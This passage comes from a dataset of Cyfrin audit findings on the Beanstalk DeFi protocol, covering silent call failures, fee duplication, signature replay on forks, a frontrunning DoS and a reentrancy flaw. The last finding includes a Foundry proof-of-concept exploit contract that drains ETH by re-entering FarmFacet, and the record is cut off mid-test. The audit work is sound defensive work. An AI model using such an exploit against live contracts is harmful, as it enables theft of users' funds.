      "content": "**Description:** In the case of a `Pipeline` function call to a target address with no code, the call will silently fail. Scenarios where this may occur include calls to non-contract addresses or on a contract where its self-destruction occurs beforehand. This is most relevant when considering [`Pipeline::advancedPipe`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L91) given that the next call uses as input the return from the previous call which may lead to an undesired final result or revert. Pipeline can be used standalone but it is also wrapped by Beanstalk for use within the protocol by the [DepotFacet](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/DepotFacet.sol#L15-L16).\n\n**Impact:** Silent failure of a call to an address with no code produces a silent failure within Pipeline, which can lead to undesired final outcomes. According to the [Pipeline Whitepaper](https://evmpipeline.org/pipeline.pdf):\n>The combination of Pipeline, Depot and Clipboard allows EVM users to perform arbitrary validations, through arbitrarily many protocols, in a single transaction.\n\nThis implies that Pipeline should be able to be used with any protocol; therefore, the edge case must be considered where a call to a contract that has just been self-destructed should revert. Considering the low likelihood, this issue is determined to be of **LOW** severity.\n\n**Recommended Mitigation:** If `Pipeline` is intended to support calls to EOA, and to prevent silent failure to this kind of address, an extra attribute `isContractCall` can be added to `PipeCall` and `AdvancedPipeCall` - if the call return data size is zero, and this value is true, then it should be checked whether the call was performed on a target contract, and if not then revert.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31203",
      "title": "Silent failure can occur when delegating to a Diamond Proxy facet with no code",
      "impact": "LOW",
      "content": "**Description:** If the [Diamond proxy delegates](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/Diamond.sol#L35-L55) to an incorrect address or an implementation that has been self-destructed, the call to the \"implementation\" will return a success boolean despite no code being executed.\n\n**Impact:** In the case of a payable function call with ETH attached, silent failure of the delegatecall to a non-existent implementation can result in this value being permanently lost.\n\n**Proof of Concept:** The *No contract existence check* section of the article [*Good idea, bad design: How the Diamond standard falls short*](https://blog.trailofbits.com/2020/10/30/good-idea-bad-design-how-the-diamond-standard-falls-short/) by [Trail of Bits](https://www.trailofbits.com/) further details this issue.\n\n**Recommended Mitigation:** Consider checking for contract existence when calling an arbitrary contract. Alternatively, in the interest of gas efficiency, only perform this check if the return data size of the call is zero since the opposite result means that some code was executed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31202",
      "title": "Lack of existence validation when adding a new unripe token",
      "impact": "LOW",
      "content": "**Description:** [`UnripeFacet::addUnripeToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/barn/UnripeFacet.sol#L227-L236) does not currently check if the `unripeToken` has been already added. Unlike `LibWhitelist::whitelistToken`, which has [this check](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibWhitelist.sol#L80), the current implementation allows the Beanstalk Community Multisig (BCM) to modify the settings for existing unripe tokens.\n\n**Impact:** Unripe tokens were introduced as a mechanism for recapitalization after the governance hack of April 2022. While the BCM affords more flexibility and control compared to the previous implementation of fully on-chain governance, if the BCM were to become compromised in any way or sign off on a vulnerable contract upgrade, privileged access to this function could result in the ability to manipulate the unripe token mechanisms that exist within the protocol by altering the Merkle root for a pre-existing unripe token.\n\n**Recommended Mitigation:** Validate that the unripe token has not already been added to prevent changes to existing unripe tokens.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31201",
      "title": "Flood mechanism is susceptible to DoS attacks by a frontrunner, breaking re-peg mechanism when BEAN is above 1 USD",
      "impact": "MEDIUM",
      "content": "**Description:** A [call](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L276) to the BEAN/3CRV Metapool is made within`Weather::sop`, swapping Beans for 3CRV, to aid in returning Beanstalk to peg via a mechanism known as \"Flood\" (formerly Season of Plenty, or sop) when the Beanstalk Farm has been \"Oversaturated\" ($P > 1$; $Pod Rate < 5\\%$) for more than one Season and for each additional Season in which it continues to be Oversaturated. This is achieved by minting additional Beans and selling them directly on Curve, distributing the proceeds from the sale as 3CRV to Stalkholders.\n\nUnlike [`Oracle::stepOracle`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L57), which returns the [aggregate time-weighted `deltaB`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Oracle.sol#L42-L46) value across both the BEAN/3CRV Metapool and BEAN/ETH Well, the current shortage/excess of Beans during the [handling of Rain](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L243) in [`Weather::stepWeather`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L192) are [calculated directly](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L260) from the Curve Metapool via [`LibBeanMetaCurve::getDeltaB`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L260).\n\n```solidity\n    function getDeltaB() internal view returns (int256 deltaB) {\n        uint256[2] memory balances = C.curveMetapool().get_balances();\n        uint256 d = getDFroms(balances);\n        deltaB = getDeltaBWithD(balances[0], d);\n    }\n```\n\nThis introduces the possibility that a long-tail MEV bot could perform a denial-of-service attack on the Flood mechanism by performing a sandwich attack on `SeasonFacet::gm` whenever the conditions are met such that `Weather::sop` is called. The attacker would first front-run the transaction by selling BEAN for 3CRV, bringing the price of BEAN back to peg, which could result in [`newBeans <= 0`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L261), thus bypassing the subsequent logic, and then back-running to repurchase their sold BEAN effectively maintaining the price of BEAN above peg.\n\nThe cost for performing this attack is 0.08% of the utilized funds. However, not accounting for other mechanisms (such as Convert) designed to return the price of Bean to peg, Beanstalk would need to wait the Season duration of 1 hour before making another effective `SeasonFacet::gm`, provided that the previous transaction did not revert. In the subsequent call, the attacker can replicate this action at the same cost, and it is possible that the price of BEAN may have increased further during this hour.\n\n**Impact:** Attempts by Beanstalk to restore peg via the Flood mechanism are susceptible to denial-of-service attacks by a sufficiently well-funded sandwich attacker through frontrunning of `SeasonFacet::gm`.\n\n**Recommended Mitigation:** Consider the use of an oracle to determine how many new Beans should be minted and sold for 3CRV. This implies the following modification:\n```diff\n    function sop() private {\n-       int256 newBeans = LibBeanMetaCurve.getDeltaB();\n+       int256 currentDeltaB = LibBeanMetaCurve.getDeltaB();\n+       (int256 deltaBFromOracle,)  = - LibCurveMinting.twaDeltaB();\n+       // newBeans = max(currentDeltaB, deltaBFromOracle)\n+       newBeans = currentDeltaB > deltaBFromOracle ? currentDeltaB : deltaBFromOracle;\n\n        if (newBeans <= 0) return;\n\n        uint256 sopBeans = uint256(newBeans);\n        uint256 newHarvestable;\n\n        // Pay off remaining Pods if any exist.\n        if (s.f.harvestable < s.r.pods) {\n            newHarvestable = s.r.pods - s.f.harvestable;\n            s.f.harvestable = s.f.harvestable.add(newHarvestable);\n            C.bean().mint(address(this), newHarvestable.add(sopBeans));\n        } else {\n            C.bean().mint(address(this), sopBeans);\n        }\n\n        // Swap Beans for 3CRV.\n        uint256 amountOut = C.curveMetapool().exchange(0, 1, sopBeans, 0);\n\n        rewardSop(amountOut);\n        emit SeasonOfPlenty(s.season.current, amountOut, newHarvestable);\n    }\n```\n\nThe motivation for using the maximum value between the current `deltaB` and that calculated from time-weighted average balances is that the action of an attacker increasing `deltaB` to carry out a sandwich attack would be nonsensical as excess Bean minted by the Flood mechanism would be sold for additional 3CRV. In this way, anyone attempting to increase `deltaB` would essentially be giving away their 3CRV LP tokens to Stalkholders. Therefore, by using the maximum `deltaB`, it is ensured that the impact of any attempt to execute the attack described above would be minimal and economically unattractive. If no one attempts the attack, the behavior will remain as originally intended.\n\n\\clearpage",
      "summary": "\nThis bug report discusses a vulnerability in the Beanstalk protocol that could potentially be exploited by attackers to manipulate the price of BEAN tokens. The vulnerability is related to a mechanism called \"Flood\" that is used to restore the price of BEAN to its intended value. The report suggests a modification to the protocol that could mitigate the risk of such attacks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31200",
      "title": "FundraiserFacet logic does not consider contract upgrades which can increase token decimals",
      "impact": "MEDIUM",
      "content": "**Description:** The fundraiser logic in `FundraiserFacet` assumes that the decimals of the token being raised will remain with the same number of decimals from when a fundraiser is created to when it is funded. In the case of USDC, a contract upgrade that increases the number of decimals would invalidate this assumption, jeopardizing the accounting handled by `s.fundraisers[id].remaining`.\n\n**Impact:** If the original fundraiser token increases its decimals, a user can send fewer tokens than expected through `FundraiserFacet::fund` and receive more Pods than intended.\n\n**Proof of Concept:**\n1. Beanstalk creates a USDC fundraiser for 1M USDC\n2. USDC decimals are updated from 6 to 18, meaning that the amount of USDC to raise should be $1,000,000 \\times 10^{18}$ rather than $1,000,000 \\times 10^{6} = 1 \\times 10^{12}$.\n3. Eve uses $1 \\times 10^{12}$ basic units of USDC (now equivalent to $1 \\times 10^{-18}$ USDC) to completely fund the fundraiser, receiving Pods for a value of 1M Beans.\n\nThe final result is that Beanstalk has received $1 \\times 10^{-6}$ USD in USDC in exchange for the issuance of 1M Pods.\n\n**Recommended Mitigation:** It would be advisable to save the decimals during fundraiser creation and check their consistency when calls are made to `FundraiserFacet::fund`. This can be achieved by creating a new function that updates `s.fundraisers[id].remaining` and the saved decimals in case of an update. For instance:\n\n```diff\n    // FundraiserFacet.sol\n    function createFundraiser(\n        address payee,\n        address token,\n        uint256 amount\n    ) external payable {\n        LibDiamond.enforceIsOwnerOrContract();\n\n        // The {FundraiserFacet} was initially created to support USDC, which has the\n        // same number of decimals as Bean (6). Fundraisers created with tokens measured\n        // to a different number of decimals are not yet supported.\n        if (ERC20(token).decimals() != 6) {\n            revert(\"Fundraiser: Token decimals\");\n        }\n\n        uint32 id = s.fundraiserIndex;\n        s.fundraisers[id].token = token;\n        s.fundraisers[id].remaining = amount;\n        s.fundraisers[id].total = amount;\n        s.fundraisers[id].payee = payee;\n        s.fundraisers[id].start = block.timestamp;\n+       s.fundraisers[id].savedDecimals = 6;\n        s.fundraiserIndex = id + 1;\n\n        // Mint Beans to pay for the Fundraiser. During {fund}, 1 Bean is burned\n        // for each `token` provided to the Fundraiser.\n        // Adjust `amount` based on `token` decimals to support tokens with different decimals.\n        C.bean().mint(address(this), amount);\n\n        emit CreateFundraiser(id, payee, token, amount);\n    }\n\n    function fund(\n        uint32 id,\n        uint256 amount,\n        LibTransfer.From mode\n    ) external payable nonReentrant returns (uint256) {\n        uint256 remaining = s.fundraisers[id].remaining;\n\n        // Check amount remaining and constrain\n        require(remaining > 0, \"Fundraiser: completed\");\n        if (amount > remaining) {\n            amount = remaining;\n        }\n+\n+       require(s.fundraisers[id].token.decimals() == s.fundraisers[id].savedDecimals, \"Fundraiser token decimals not synchronized.\");\n+\n        // Transfer tokens from msg.sender -> Beanstalk\n        amount = LibTransfer.receiveToken(\n            IERC20(s.fundraisers[id].token),\n            amount,\n            msg.sender,\n            mode\n        );\n        s.fundraisers[id].remaining = remaining - amount; // Note: SafeMath is redundant here.\n        emit FundFundraiser(msg.sender, id, amount);\n\n        // If completed, transfer tokens to payee and emit an event\n        if (s.fundraisers[id].remaining == 0) {\n            _completeFundraiser(id);\n        }\n\n        // When the Fundraiser was initialized, Beanstalk minted Beans.\n        C.bean().burn(amount);\n\n        // Calculate the number of Pods to Sow.\n        // Fundraisers bypass Morning Auction behavior and Soil requirements,\n        // calculating return only based on the current `s.w.t`.\n        uint256 pods = LibDibbler.beansToPods(\n            amount,\n            uint256(s.w.t).mul(LibDibbler.TEMPERATURE_PRECISION)\n        );\n\n        // Sow for Pods and return the number of Pods received.\n        return LibDibbler.sowNoSoil(msg.sender, amount, pods);\n    }\n+\n+   function synchronizeFundraiserDecimals(uint32 id) public {\n+       uint32 currentTokenDecimals = s.fundraisers[id].token.decimals();\n+       uint32 savedDecimals = s.fundraisers[id].savedDecimals;\n+       require(currentTokenDecimals != savedDecimals, \"Fundraiser token decimals already synchronized\");\n+       if (currentTokenDecimals > savedDecimals) {\n+           uint32 decimalDifference = currentTokenDecimals - savedDecimals;\n+           s.fundraisers[id].total = s.fundraisers[id].total * decimalDifference;\n+           s.fundraisers[id].remaining = s.fundraisers[id].remaining * decimalDifference;\n+       } else {\n+           uint32 decimalDifference = savedDecimals - currentTokenDecimals;\n+           s.fundraisers[id].total = s.fundraisers[id].total / decimalDifference;\n+           s.fundraisers[id].remaining = s.fundraisers[id].remaining / decimalDifference;\n+       }\n+   }\n\n    // AppStorage.sol\n    struct Fundraiser {\n        address payee;\n        address token;\n        uint256 total;\n        uint256 remaining;\n        uint256 start;\n+       uint256 savedDecimals;\n    }\n```",
      "summary": "\nThis bug report describes an issue with the fundraiser logic in the `FundraiserFacet` contract. It assumes that the number of decimals for the token being raised will remain the same from when the fundraiser is created to when it is funded. However, if the token's decimals are changed, it can cause problems with the accounting handled by the contract. This could result in users receiving more Pods (the fundraising token) than intended. To fix this, it is recommended to save the decimals during fundraiser creation and check for consistency when calls are made to fund the fundraiser. A new function should also be created to update the decimals in case of an update.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31199",
      "title": "Duplicate fees will be paid by `LibTransfer::transferFee` when transferring fee-on-transfer tokens with `EXTERNAL_INTERNAL` 'from' mode and `EXTERNAL` 'to' mode",
      "impact": "MEDIUM",
      "content": "**Description:** Beanstalk utilizes an internal virtual balance system that significantly reduces transaction fees when using tokens that are intended to remain within the protocol. `LibTransfer` achieves this by managing every transfer between accounts, considering both the origin 'from' and destination 'to' modes of the in-flight funds. As a result, there are four types of transfers based on the source of the funds (from mode):\n\n* `EXTERNAL`: The sender will not use their internal balances for the operation.\n* `INTERNAL`: The sender will use their internal balances for the operation.\n* `EXTERNAL_INTERNAL`: The sender will attempt to utilize their internal balance to transfer all desired funds. If funds remain to be sent, their externally owned funds will be utilized to cover the difference.\n* `INTERNAL_TOLERANT`: The sender will utilize their internal balances for the operation. With insufficient internal balance, the operation will continue (without reverting) with this reduced amount. It is, therefore, imperative to always check the return value of LibTransfer functions to continue the execution of calling functions with the true utilized amount, especially in this internal tolerant case.\n\nThe current implementation of [`LibTransfer::transferToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTransfer.sol#L43-L44) for `(from mode: EXTERNAL ; to mode: EXTERNAL)` ensures a safe transfer operation from the sender to the recipient:\n\n```solidity\n// LibTransfer::transferToken\nif (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) {\n    uint256 beforeBalance = token.balanceOf(recipient);\n    token.safeTransferFrom(sender, recipient, amount);\n    return token.balanceOf(recipient).sub(beforeBalance);\n}\namount = receiveToken(token, amount, sender, fromMode);\nsendToken(token, amount, recipient, toMode);\nreturn amount;\n```\n\nPerforming this operation allows duplication of fee-on-transfer token fees to be avoided if funds are first transferred to the contract and then to the recipient; however, `LibTransfer::transferToken` balance will incur double the fee if this function is used for `(from mode: EXTERNAL_INTERNAL ; to mode: EXTERNAL)` when the internal balance is insufficient cover the full transfer amount, given that:\n\n1. The remaining token balance would first be transferred to the Beanstalk Diamond, incurring fees.\n2. The remaining token balance would then be transferred to the recipient, incurring fees again.\n\n**Impact:** `LibTransfer::transferToken` will incur duplicate fees if this function is used for `(from mode: EXTERNAL_INTERNAL ; to mode: EXTERNAL)` with fee-on-transfer tokens if the internal balance is not sufficient to cover the full transfer amount.\n\nEven though Beanstalk currently does not impose any fees on token transfers, USDT is associated with the protocol, and its contract has already introduced logic to implement a fee on token transfer mechanism if ever desired in the future. Considering that the duplication of fees implies a loss of funds, but also taking into account the low likelihood of this issue occurring, the severity assigned to this issue is **MEDIUM**.\n\n**Recommended Mitigation:** Add an internal function `LibTransfer::handleFromExternalInternalToExternalTransfer` to handle this case to avoid duplication of fees. For instance:\n\n```solidity\nfunction handleFromExternalInternalToExternalTransfer(\n    IERC20 token,\n    address sender,\n    address recipient,\n    address amount\n) internal {\n    uint256 amountFromInternal = LibBalance.decreaseInternalBalance(\n        sender,\n        token,\n        amount,\n        true // allowPartial to avoid revert\n    );\n    uint256 pendingAmount = amount - amountFromInternal;\n    if (pendingAmount != 0) {\n        token.safeTransferFrom(sender, recipient, pendingAmount);\n    }\n    token.safeTransfer(sender, amountFromInternal);\n}\n```\n\nThen consider the use of this new function in `LibTransfer::transferToken`:\n\n```diff\n    function transferToken(\n        IERC20 token,\n        address sender,\n        address recipient,\n        uint256 amount,\n        From fromMode,\n        To toMode\n    ) internal returns (uint256 transferredAmount) {\n-       if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) {\n+       if (toMode == To.EXTERNAL) {\n+           if (fromMode == From.EXTERNAL) {\n                uint256 beforeBalance = token.balanceOf(recipient);\n                token.safeTransferFrom(sender, recipient, amount);\n                return token.balanceOf(recipient).sub(beforeBalance);\n+           } else if (fromMode == From.EXTERNAL_INTERNAL) {\n+               handleFromExternalInternalToExternalTransfer(token, sender, recipient, amount);\n+               return amount;\n+           }\n        }\n        amount = receiveToken(token, amount, sender, fromMode);\n        sendToken(token, amount, recipient, toMode);\n        return amount;\n    }\n```",
      "summary": "\nThe Beanstalk protocol has a system in place to reduce transaction fees when using certain tokens. However, there is a bug in the code that can result in duplicate fees being charged if the token is transferred from an external source to another external source. This can lead to a loss of funds, but the chances of it happening are low. To fix this issue, a new function should be added to handle these transfers and avoid duplicate fees.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31198",
      "title": "`LibTokenPermit` logic is susceptible to signature replay attacks in the case of a hard fork",
      "impact": "MEDIUM",
      "content": "**Description:** Due to the implementation of [`LibTokenPermit::_buildDomainSeparator`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTokenPermit.sol#L59-L69) using the static `CHAIN_ID` [constant](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTokenPermit.sol#L65) specified in [`C.sol`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L92-L94), in the case of a hard fork, all signed permits from Ethereum mainnet can be replayed on the forked chain.\n\n**Impact:** A signature replay attack on the forked chain means that any signed permit given to an address on one of the chains can be re-used on the other as long as the account nonce is respected. Given that BEAN has a portion of its liquidity in WETH, it could be susceptible to some parallelism with the [Omni Bridge calldata replay exploit](https://medium.com/neptune-mutual/decoding-omni-bridges-call-data-replay-exploit-f1c7e339a7e8) on ETHPoW.\n\n**Recommended Mitigation:** Modify the `_buildDomainSeparator` implementation to read the current `block.chainid` global context variable directly. If gas efficiency is desired, it is recommended to cache the current chain id on contract creation and only recompute the domain separator if a change of chain id is detected (i.e. `block.chainid` != cached chain id).\n\n```diff\n    function _buildDomainSeparator(bytes32 typeHash, bytes32 name, bytes32 version) internal view returns (bytes32) {\n        return keccak256(\n            abi.encode(\n                typeHash,\n                name,\n                version,\n-               C.getChainId(),\n+               block.chainid,\n                address(this)\n            )\n        );\n    }\n```",
      "summary": "\nReport Summary:\n\nA bug has been found in the implementation of a function called `_buildDomainSeparator` in the `LibTokenPermit` library of the Beanstalk protocol. This function uses a static constant called `CHAIN_ID` from another contract called `C.sol` to generate a unique identifier for each transaction. However, this can lead to a signature replay attack on a forked chain, where signed permits from the Ethereum mainnet can be used on the forked chain. This could potentially affect the liquidity of BEAN, as it has a portion of its liquidity in WETH. To mitigate this issue, it is recommended to modify the `_buildDomainSeparator` function to read the current chain ID directly from the `block.chainid` global context variable. It is also suggested to cache the current chain ID on contract creation for gas efficiency. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31197",
      "title": "`FarmFacet` functions are susceptible to the draining of intermediate value sent by the caller via reentrancy when execution is handed off to an untrusted external contract",
      "impact": "HIGH",
      "content": "**Description:** The `FarmFacet` enables multiple Beanstalk functions to be called in a single transaction using Farm calls. Any function stored in Beanstalk's EIP-2535 DiamondStorage can be called as a Farm call and, similar to the Pipeline calls originated in the `DepotFacet`, advanced Farm calls can be made within `FarmFacet` utilizing the \"clipboard\" encoding [documented](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibFunction.sol#L49-L74) in `LibFunction`.\n\nBoth [`FarmFacet::farm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L35-L45) and [`FarmFacet::advancedFarm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L53-L63) make use of the [`withEth` modifier](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L100-L107) defined as follows:\n\n```solidity\n// signals to Beanstalk functions that they should not refund Eth\n// at the end of the function because the function is wrapped in a Farm function\nmodifier withEth() {\n    if (msg.value > 0) s.isFarm = 2;\n    _;\n    if (msg.value > 0) {\n       s.isFarm = 1;\n        LibEth.refundEth();\n    }\n}\n```\nUsed in conjunction with [`LibEth::refundEth`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibEth.sol#L16-L26), within the `DepotFacet`, for example, the call is identified as originating from the `FarmFacet` if `s.isFarm == 2`. This indicates that an ETH refund should occur at the end of top-level FarmFacet function call rather than intermediate Farm calls within Beanstalk so that the value can be utilized in subsequent calls.\n\n```solidity\nfunction refundEth()\n    internal\n{\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    if (address(this).balance > 0 && s.isFarm != 2) {\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\n            new bytes(0)\n        );\n        require(success, \"Eth transfer Failed.\");\n    }\n}\n```\n\nSimilar to the vulnerabilities in `DepotFacet` and `Pipeline`, `FarmFacet` Farm functions are also susceptible to the draining of intermediate value sent by the caller via reentrancy by an untrusted and malicious external contract. In this case, the attacker could be the recipient of Beanstalk Fertilizer, for example, given this is a likely candidate for an action that may be performed via `FarmFacet` functions, utilizing [`TokenSupportFacet::transferERC1155`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenSupportFacet.sol#L85-L92), and because transfers of these tokens are performed \"safely\" by calling [`Fertilizer1155:__doSafeTransferAcceptanceCheck`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/tokens/Fertilizer/Fertilizer1155.sol#L42) which in turn calls the `IERC1155ReceiverUpgradeable::onERC1155Received` hook on the Fertilizer recipient.\n\nContinuing the above example, a malicious recipient could call back into the `FarmFacet` and re-enter the Farm functions via the `Fertilizer1155` safe transfer acceptance check with empty calldata and only `1 wei` of payable value. This causes the execution of the attacker's transaction to fall straight through to the refund logic, given no loop iterations occur on the empty data and the conditional blocks within the modifier are entered due to the (ever so slightly) non-zero `msg.value`. The call to `LibEth::refundEth` will succeed since`s.isFarm == 1` in the attacker's context, sending the entire Diamond proxy balance. When execution continues in the context of the original caller's Farm call, it will still enter the conditional since their `msg.value` was also non-zero; however, there is no longer any ETH balance to refund, so this call will fall through without sending any value as the conditional block is not entered.\n\n**Impact:** A malicious external contract handed control of execution during the lifetime of a Farm call can reenter and steal intermediate user funds. As such, this finding is determined to be of **HIGH** severity.\n\n**Proof of Concept:** The following forge test demonstrates the ability of a Fertilizer recipient, for example, to re-enter Beanstalk, draining funds remaining in the Diamond that should have been refunded to the original caller at the end of execution:\n\n```solidity\ncontract FertilizerRecipient {\n    bool exploited;\n\n    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {\n        console.log(\"entered exploiter onERC1155Received\");\n        if (!exploited) {\n            exploited = true;\n            console.log(\"exploiting farm facet farm call\");\n            AdvancedFarmCall[] memory data = new AdvancedFarmCall[](0);\n            IBeanstalk(BEANSTALK).advancedFarm{value: 1 wei}(data);\n            console.log(\"finished exploiting farm facet farm call\");\n        }\n        return bytes4(0xf23a6e61);\n    }\n\n    fallback() external payable {\n        console.log(\"entered exploiter fallback\");\n        console.log(\"Beanstalk balance: \", BEANSTALK.balance);\n        console.log(\"Exploiter balance: \", address(this).balance);\n    }\n}\n\ncontract FarmFacetPoC is Test {\n    uint256 constant TOKEN_ID = 3445713;\n    address constant VICTIM = address(0x995D1e4e2807Ef2A8d7614B607A89be096313916);\n    FertilizerRecipient exploiter;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", ATTACK_BLOCK);\n\n        FarmFacet farmFacet = new FarmFacet();\n        vm.etch(FARM_FACET, address(farmFacet).code);\n\n        Fertilizer fert = new Fertilizer();\n        vm.etch(FERTILIZER, address(fert).code);\n\n        assertGe(IERC1155(FERTILIZER).balanceOf(VICTIM, TOKEN_ID), 1, \"Victim does not have token\");\n\n        exploiter = new FertilizerRecipient();\n        vm.deal(address(exploiter), 1 wei);\n\n        vm.label(VICTIM, \"VICTIM\");\n        vm.deal(VICTIM, 10 ether);\n\n        vm.label(BEANSTALK, \"Beanstalk Diamond\");\n        vm.label(FERTILIZER, \"Fertilizer\");\n        vm.label(address(exploiter), \"Exploiter\");\n    }\n\n    function test_attack() public {\n        emit log_named_uint(\"VICTIM balance before: \", VICTIM.balance);\n        emit log_named_uint(\"BEANSTALK balance before: \", BEANSTALK.balance);\n        emit log_named_uint(\"Exploiter balance before: \", address(exploiter).balance);\n\n        vm.startPrank(VICTIM);\n        // approve Beanstalk to transfer Fertilizer\n        IERC1155(FERTILIZER).setApprovalForAll(BEANSTALK, true);\n\n        // encode call to `TokenSupportFacet::transferERC1155`\n        bytes4 selector = 0x0a7e880c;\n        assertEq(IBeanstalk(BEANSTALK).facetAddress(selector), address(0x5e15667Bf3EEeE15889F7A2D1BB423490afCb527), \"Incorrect facet address/invalid function\");\n\n        AdvancedFarmCall[] memory data = new AdvancedFarmCall[](1);\n        data[0] = AdvancedFarmCall(abi.encodeWithSelector(selector, address(FERTILIZER), address(exploiter), TOKEN_ID, 1), abi.encodePacked(bytes1(0x00)));\n        IBeanstalk(BEANSTALK).advancedFarm{value: 10 ether}(data);\n        vm.stopPrank();\n\n        emit log_named_uint(\"VICTIM balance 